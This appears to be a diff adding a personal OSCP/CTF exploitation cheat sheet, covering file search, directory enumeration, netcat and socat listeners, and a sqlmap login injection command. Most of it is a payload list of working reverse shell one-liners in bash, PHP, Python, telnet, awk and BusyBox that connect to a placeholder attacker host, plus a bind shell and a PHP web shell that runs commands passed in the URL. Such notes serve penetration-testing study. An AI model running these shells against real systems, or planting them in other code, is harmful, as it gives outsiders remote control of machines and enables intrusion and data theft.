@@ -1,0 +1,91 @@
+OSCP / Exploitation Notes
+=========================
+Placeholders: <TARGET_IP>, <ATTACKER_IP>, <PORT>. Never hardcode real IPs.
+
+--------------------------------------------------------------------------
+FILE SEARCH (post-exploitation / CTF)
+--------------------------------------------------------------------------
+search -f *.txt                 # Meterpreter
+find -name flag.txt
+find / -type f -name "rockyou.txt" 2>/dev/null
+
+--------------------------------------------------------------------------
+DIRECTORY ENUMERATION
+--------------------------------------------------------------------------
+gobuster dir -u "http://www.example.thm/" \
+  -w /usr/share/wordlists/dirb/small.txt -t 64
+
+--------------------------------------------------------------------------
+LISTENERS
+--------------------------------------------------------------------------
+nc -lvnp <PORT>              # plain netcat listener
+rlwrap nc -lvnp <PORT>       # rlwrap adds readline (history/editing)
+ncat -lvnp <PORT>            # ncat (Nmap project)
+ncat --ssl -lvnp <PORT>      # ncat with TLS
+socat -d -d TCP-LISTEN:<PORT> STDOUT
+
+RLWRAP: small utility using GNU readline - gives editing keys + history.
+NCAT : improved netcat from the Nmap project; adds SSL encryption.
+SOCAT: connects two data sources (e.g. two hosts / a host and a file).
+
+--------------------------------------------------------------------------
+REVERSE SHELLS
+--------------------------------------------------------------------------
+# --- Netcat FIFO reverse shell (works with plain nc) ---
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
+
+# --- Bash ---
+bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
+exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>; cat <&5 | while read line; do $line 2>&5 >&5; done
+0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/<PORT>; sh <&196 >&196 2>&196
+bash -i 5<> /dev/tcp/<ATTACKER_IP>/<PORT> 0<&5 1>&5 2>&5
+
+# --- PHP ---
+php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);shell_exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);system("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);passthru("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);popen("sh <&3 >&3 2>&3", "r");'
+
+# --- Python ---
+export RHOST="<ATTACKER_IP>"; export RPORT=<PORT>; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+
+# --- Telnet ---
+TF=$(mktemp -u); mkfifo $TF && telnet <ATTACKER_IP> <PORT> 0<$TF | sh 1>$TF
+
+# --- AWK ---
+awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER_IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+# --- BusyBox ---
+busybox nc <ATTACKER_IP> <PORT> -e sh
+
+--------------------------------------------------------------------------
+BIND SHELLS
+--------------------------------------------------------------------------
+# On the target - wait for the attacker to connect:
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 <PORT> > /tmp/f
+
+# From the attacker:
+nc -nv <TARGET_IP> <PORT>
+
+--------------------------------------------------------------------------
+WEB SHELL
+--------------------------------------------------------------------------
+# shell.php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+
+# Trigger:
+http://victim.com/uploads/shell.php?cmd=whoami
+
+--------------------------------------------------------------------------
+SQL INJECTION
+--------------------------------------------------------------------------
+sqlmap -u "http://<TARGET_IP>/ai/includes/user_login?email=test&password=test" \
+  --dbs --batch
+# See recuite.txt for a full sqlmap walkthrough (request file, --tables, --dump).
